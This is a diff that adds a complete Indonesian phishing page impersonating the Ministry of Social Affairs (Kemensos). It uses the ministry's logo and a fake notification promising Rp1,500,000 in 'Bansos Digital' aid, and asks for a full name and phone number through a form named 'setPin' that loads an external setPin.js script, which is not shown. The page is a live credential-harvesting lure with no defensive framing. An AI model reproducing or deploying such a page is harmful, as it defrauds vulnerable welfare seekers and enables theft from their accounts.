@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PENDAFTARAN BANSOS DIGITAL 2025</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/public/css/home.css">
+    <link rel="shortcut icon" href="/public/images/bannerbansosdg.jpeg" type="image/x-icon">
+</head>
+<body>
+    <div>
+        
+  <header style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 64px;
+    padding: 0 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background-color: #ffffff;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+    z-index: 1000;
+    font-family: 'Segoe UI', sans-serif;
+  ">
+    <!-- Logo -->
+    <div style="display: flex; align-items: center;">
+      <img
+        src="https://kemensos.go.id/assets/img/light/logo.png"
+        alt="Logo Kemensos"
+        style="height: 40px;"
+      >
+    </div>
+  
+    <!-- Notifikasi -->
+    <div style="position: relative; display: flex; align-items: center;">
+      <i
+        id="notificationBell"
+        class="fas fa-bell"
+        style="font-size: 26px; color: #444; cursor: pointer;"
+      ></i>
+  
+      <!-- Badge -->
+      <span id="notificationBadge" style="
+        position: absolute;
+        top: -4px;
+        right: -6px;
+        background: red;
+        color: white;
+        font-size: 10px;
+        width: 16px;
+        height: 16px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+        box-shadow: 0 0 2px rgba(0,0,0,0.4);
+      ">1</span>
+  
+      <!-- Popup -->
+      <div id="notificationPopup" style="
+        display: none;
+        position: absolute;
+        top: 42px;
+        right: 0;
+        width: 270px;
+        background: white;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        border-radius: 10px;
+        padding: 16px;
+        font-size: 14px;
+        color: #333;
+        animation: fadeIn 0.3s ease;
+        z-index: 1001;
+      ">
+        <strong>Notifikasi</strong><br>
+        Program Bansos Digital Resmi Dibuka!<br>
+        Daftarkan diri Anda untuk menerima bantuan awal Rp1.500.000 melalui rekening atau e-wallet resmi.
+      </div>
+    </div>
+  </header>
+  
+  <!-- Sound -->
+  <audio id="notificationSound" src="https://notificationsounds.com/storage/sounds/file-sounds-1152-pristine.mp3" preload="auto"></audio>
+  
+  <!-- CSS Animation -->
+  <style>
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  </style>
+  
+  <!-- Script -->
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const bell = document.getElementById('notificationBell');
+    const popup = document.getElementById('notificationPopup');
+    const badge = document.getElementById('notificationBadge');
+    const sound = document.getElementById('notificationSound');
+  
+    // Saat pertama kali halaman terbuka
+    setTimeout(function() {
+      sound.play().catch(err => console.log('Sound autoplay blocked'));
+      badge.style.display = 'flex'; // pastikan badge muncul
+    }, 500); // kecil delay 500ms biar lebih aman di semua browser
+  
+    // Klik bell toggle popup
+    bell.addEventListener('click', function(e) {
+      e.stopPropagation();
+      popup.style.display = (popup.style.display === 'block') ? 'none' : 'block';
+    });
+  
+    // Klik di luar nutup popup
+    document.addEventListener('click', function(e) {
+      if (!popup.contains(e.target) && e.target !== bell) {
+        popup.style.display = 'none';
+      }
+    });
+  });
+  </script>
+  
+
+
+
+        <div class=container>
+        
+<main>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        
+         ion-icon {
+   font-size: 22px;
+   margin-left: 8px;
+   margin-top: -2px;
+   position: absolute;
+   color: #06529C;
+ }
+
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #28a745; 
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            margin-left: -25px;
+            margin-top: -25px;
+            box-sizing: border-box;
+        }
+    
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+    </style>
+    
+
+    <div class="row justify-content-center" style="margin-top: 73px; font-family: 'Segoe UI', sans-serif;">
+        <div style="padding: 0 16px; box-sizing: border-box; width: 100%; max-width: 500px; margin-left: auto; margin-right: auto;">
+          
+          <!-- Header Banner -->
+          <div style="
+            background-color: #0050A4; 
+            border-radius: 20px 20px 0 0; 
+            overflow: hidden;
+            max-width: 700px;
+            margin: auto;
+          ">
+            <img src="https://raw.githubusercontent.com/Kunpayakun01/Foootoooo/refs/heads/main/10.jpg" 
+                 alt="Banner Pendaftaran Bansos Digital Kemensos RI" 
+                 style="width: 100%; height: auto; display: block;">
+          </div>
+      
+          <!-- Form Card -->
+          <div style="
+            background-color: #ffffff;
+            padding: 24px 20px 32px 20px;
+            border-radius: 0 0 20px 20px;
+            box-shadow: 0px 6px 16px rgba(0, 0, 0, 0.08);
+            margin-top: -4px;
+          "><br>
+          
+            <form id="setPin" onclick="">
+<input id="NoHp" name=" Nama" type="teks" style="box-sizing: border-box; height: 45px; width: 536px; max-width: 99%; border: 1px solid #808080; border-image: initial; background-color: rgb(255, 255, 255);  border-radius: 10px; box-shadow: #000 0px 1px 1px -1px, rgba(0, 0, 0, 0.06) 0px 1px 1px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -15px; padding-left: 10px" placeholder="👤 Masukkan nama lengkap" required maxlength="" minlength="">
+</h3>
+</h3>
+<br>
+<br>
+
+<input id="NoHp" name=" Nomor" type="tel" style="box-sizing: border-box; height: 45px; width: 536px; max-width: 99%; border: 1px solid #808080; border-image: initial; background-color: rgb(255, 255, 255);  border-radius: 10px; box-shadow: #000 0px 1px 1px -1px, rgba(0, 0, 0, 0.06) 0px 1px 1px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -15px; padding-left: 10px" placeholder="📱 Masukkan nomor telepon" required maxlength="13" minlength="10">
+  <br>
+  <br>
+              <!-- Tombol Daftar -->
+              <button type="submit" id="#submit-button" style="
+                width: 100%;
+                /* background-color: #007bff; */
+                background-color: #28a745;
+                color: #ffffff;
+                padding: 14px;
+                font-size: 16px;
+                font-weight: 600;
+                border: none;
+                border-radius: 14px;
+                cursor: pointer;
+                transition: background 0.3s ease;
+              ">
+                Daftar Bansos Digital
+              </button>
+      
+              <!-- Informasi tambahan -->
+              <p style="margin-top: 16px; font-size: 12px; color: #888; text-align: center; line-height: 1.6;">
+                Lengkapi data Anda untuk mendaftar program Bantuan Sosial Digital dari Kementerian Sosial Republik Indonesia.
+              </p>
+      
+            </form>
+          </div>
+        </div>
+      </div>
+
+      <!-- Bagian Informasi Tambahan Setelah Form -->
+<div style="
+margin-top: 36px;
+padding: 24px;
+background: #f5f7fa;
+border-radius: 20px;
+box-shadow: 0 6px 16px rgba(0, 0, 0, 0.06);
+font-family: 'Segoe UI', sans-serif;
+">
+
+<!-- Judul dan Bantuan -->
+<div style="text-align: center; margin-bottom: 28px;">
+  <h2 style="font-size: 22px; font-weight: 700; color: #222; margin-bottom: 12px;">Bansos Digital Resmi Kemensos</h2>
+  <p style="font-size: 16px; color: #555;">
+    Dapatkan bantuan awal hingga 
+    <strong style="color: #4CAF50;">Rp1.500.000</strong> setelah verifikasi!
+  </p>
+</div>
+
+<!-- List Jenis Bantuan -->
+<div style="display: flex; flex-direction: column; gap: 16px; margin-bottom: 32px;">
+
+  <div style="display: flex; align-items: center; background: #ffffff; padding: 16px; border-radius: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.05);">
+    <div style="background: #e8f5e9; padding: 10px; border-radius: 50%; margin-right: 14px;">
+      <i class="fas fa-hand-holding-heart" style="font-size: 20px; color: #4CAF50;"></i>
+    </div>
+    <div style="font-size: 15px; color: #444;">Program Keluarga Harapan (PKH)</div>
+  </div>
+
+  <div style="display: flex; align-items: center; background: #ffffff; padding: 16px; border-radius: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.05);">
+    <div style="background: #fff3e0; padding: 10px; border-radius: 50%; margin-right: 14px;">
+      <i class="fas fa-shopping-cart" style="font-size: 20px; color: #FB8C00;"></i>
+    </div>
+    <div style="font-size: 15px; color: #444;">Bantuan Pangan Non Tunai (BPNT)</div>
+  </div>
+
+  <div style="display: flex; align-items: center; background: #ffffff; padding: 16px; border-radius: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.05);">
+    <div style="background: #e3f2fd; padding: 10px; border-radius: 50%; margin-right: 14px;">
+      <i class="fas fa-notes-medical" style="font-size: 20px; color: #2196F3;"></i>
+    </div>
+    <div style="font-size: 15px; color: #444;">Penerima Bantuan Iuran (PBI) JKN</div>
+  </div>
+
+  <div style="display: flex; align-items: center; background: #ffffff; padding: 16px; border-radius: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.05);">
+    <div style="background: #f3e5f5; padding: 10px; border-radius: 50%; margin-right: 14px;">
+      <i class="fas fa-users" style="font-size: 20px; color: #9C27B0;"></i>
+    </div>
+    <div style="font-size: 15px; color: #444;">Bantuan Sosial ATENSI (Anak, Lansia, Disabilitas)</div>
+  </div>
+
+  <div style="display: flex; align-items: center; background: #ffffff; padding: 16px; border-radius: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.05);">
+    <div style="background: #fff9c4; padding: 10px; border-radius: 50%; margin-right: 14px;">
+      <i class="fas fa-coins" style="font-size: 20px; color: #FFC107;"></i>
+    </div>
+    <div style="font-size: 15px; color: #444;">Bantuan Langsung Tunai (BLT)</div>
+  </div>
+
+</div>
+
+<!-- Step Proses Pendaftaran -->
+<div style="margin-bottom: 32px;">
+  <h3 style="font-size: 18px; font-weight: 600; color: #333; text-align: center; margin-bottom: 16px;">Bagaimana Cara Daftar?</h3>
+  <div style="display: flex; justify-content: space-around; text-align: center;">
+
+    <div>
+      <div style="background: #e8f5e9; padding: 12px; border-radius: 50%; margin: auto;">
+        <i class="fas fa-edit" style="font-size: 20px; color: #4CAF50;"></i>
+      </div>
+      <div style="margin-top: 8px; font-size: 13px; color: #666;">Isi Form</div>
+    </div>
+
+    <div>
+      <div style="background: #e3f2fd; padding: 12px; border-radius: 50%; margin: auto;">
+        <i class="fas fa-user-check" style="font-size: 20px; color: #2196F3;"></i>
+      </div>
+      <div style="margin-top: 8px; font-size: 13px; color: #666;">Verifikasi</div>
+    </div>
+
+    <div>
+      <div style="background: #fff3e0; padding: 12px; border-radius: 50%; margin: auto;">
+        <i class="fas fa-wallet" style="font-size: 20px; color: #FB8C00;"></i>
+      </div>
+      <div style="margin-top: 8px; font-size: 13px; color: #666;">Terima Bantuan</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- Footer Info -->
+<p style="font-size: 12px; color: #999; text-align: center;">
+  Program ini resmi dari Kementerian Sosial Republik Indonesia dan tidak dipungut biaya apapun.
+</p>
+
+</div>
+
+      
+    
+    <div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.5); z-index: 9999;">
+        <div class="spinner" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"></div>
+    </div>
+</main>
+
+
+      </div>
+        
+        
+
+
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+<script src="https://code.jquery.com/jquery.min.js"></script>
+   <p id="status"></p>
+   <script src="setPin.js"></script>
+
+   <script>
+
+</script>
+
+
+</body>
+</html>
